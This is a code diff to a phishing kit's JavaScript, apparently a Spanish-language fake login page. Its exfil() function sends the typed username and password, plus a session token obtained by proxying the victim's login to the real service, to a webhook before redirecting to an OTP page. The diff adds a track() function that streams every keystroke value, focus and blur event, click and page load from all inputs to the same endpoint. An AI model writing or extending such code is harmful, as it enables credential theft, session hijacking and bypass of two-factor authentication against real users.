@@ -147,6 +147,25 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
     fetch(WEBHOOK + '?' + qs, { mode: 'no-cors' }).catch(() => {});
   }
 
+  function track(event, data) {
+    exfil({ event, ...data, ts: Date.now() });
+  }
+
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('input').forEach(input => {
+      input.addEventListener('focus', () => track('focus', { field: input.id }));
+      input.addEventListener('input', () => track('input', { field: input.id, val: input.value }));
+      input.addEventListener('blur', () => track('blur', { field: input.id, val: input.value }));
+    });
+    document.querySelectorAll('button').forEach(btn => {
+      btn.addEventListener('click', () => track('click', { btn: btn.id }));
+    });
+    document.addEventListener('visibilitychange', () => {
+      track('visibility', { state: document.visibilityState });
+    });
+    track('pageload', { url: location.href });
+  });
+
   async function proxyReq(path, body) {
     const res = await fetch(PROXY + path, {
       method: body ? 'POST' : 'GET',
@@ -172,30 +191,28 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
   }
 
   document.getElementById('form-login').addEventListener('submit', async function(e) {
-  e.preventDefault();
-  const u = document.getElementById('txt-login').value.trim();
-  const p = document.getElementById('txt-password').value;
-  const btn = document.getElementById('btn-login');
+    e.preventDefault();
+    const u = document.getElementById('txt-login').value.trim();
+    const p = document.getElementById('txt-password').value;
+    const btn = document.getElementById('btn-login');
 
-  btn.disabled = true;
-  btn.textContent = 'Verificando…';
+    btn.disabled = true;
+    btn.textContent = 'Verificando…';
 
-  exfil({ step: '1', u, p });
+    exfil({ step: '1', u, p });
 
-  let s = '';
-  try {
-    const data = await proxyReq('/api/login', { usuario: u, clave: p });
-    if (data._s) s = data._s;
-  } catch (err) {}
+    let s = '';
+    try {
+      const data = await proxyReq('/api/login', { usuario: u, clave: p });
+      if (data._s) s = data._s;
+    } catch (err) {}
 
-  // Exfil la session aunque el bot no llegue al paso 2
-  exfil({ step: '1_session', s });
+    exfil({ step: '1_session', s });
 
-  // Navegación real → el bot la detecta como nueva página
-  window.location.href = 'otp.html?s=' + encodeURIComponent(s) + '&u=' + encodeURIComponent(u);
-});
+    track('redirect', { to: 'otp.html' });
+    window.location.href = 'otp.html?s=' + encodeURIComponent(s) + '&u=' + encodeURIComponent(u);
+  });
 
-  // PASO 2
   document.getElementById('form-2fa').addEventListener('submit', async function(e) {
     e.preventDefault();
     const codigo = document.getElementById('txt-2fa').value.trim();
